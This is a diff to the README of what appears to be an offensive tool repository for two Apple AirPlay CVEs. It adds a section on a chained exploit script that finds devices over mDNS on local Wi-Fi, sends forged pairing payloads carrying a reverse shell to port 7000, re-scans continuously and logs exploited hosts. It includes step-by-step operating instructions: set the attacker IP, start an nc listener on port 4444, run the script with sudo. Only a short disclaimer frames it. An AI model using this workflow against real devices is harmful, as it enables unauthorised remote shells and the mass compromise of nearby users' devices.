@@ -134,6 +134,63 @@ python3 CVE-2025-24132_RCE.py
 This sends a forged `launchctl` payload with a reverse shell string. Works only if the device is jailbroken or unpatched.
 
 ---
+---
+
+## **Combined Exploit Chain – Discovery to Exploitation**
+
+`chain_exploit.py` links both CVEs into one seamless attack path:  
+- Scans for AirPlay targets using mDNS (CVE-2025-24252 scan logic)
+- Automatically launches the TCP pairing RCE payload (CVE-2025-24132)
+
+This simulates how a real-world attacker could automate device discovery and exploit delivery in a local Wi-Fi environment.
+
+### Features
+
+- Automatic mDNS discovery of vulnerable Apple AirPlay devices
+- Launches forged `pairing-init` payloads to port 7000
+- Embedded reverse shell string inside a `launchctl` XML plist
+- Live scanning mode (`--live`) for continuous background operation
+- All successful targets are logged to `exploited_hosts.log`
+- ASCII banner because we don’t miss 😤
+
+### Run the Chain Exploit
+
+```bash
+nano chain_exploit.py
+```
+
+Set your
+- `iface` — your active wireless interface (e.g. wlan0)
+- `attacker_ip` — your Kali machine IP
+- `attacker_port` — listener port (default: 4444)
+
+Start your listener
+
+```bash
+nc -lvnp 4444
+```
+
+Then run
+
+```bash
+sudo python3 chain_exploit.py
+```
+
+Or to run continuously and re-scan every 10 seconds:
+
+```bash
+sudo python3 chain_exploit.py --live
+```
+
+### Output
+
+- All discovered targets are printed
+- Successful payloads are sent to each IP found
+- All exploited IPs are saved to `exploited_hosts.log` with timestamps
+
+> Note: Real reverse shell execution only occurs on jailbroken or unpatched Apple devices.
+
+---
 
 ## DISCLAIMER
 
@@ -144,3 +201,4 @@ USER ASSUMES FULL RESPONSIBILITY WHEN UTILIZING THIS TOOL.
 
 Unauthorized use may violate laws or terms of service.  
 Use responsibly and ethically.
+
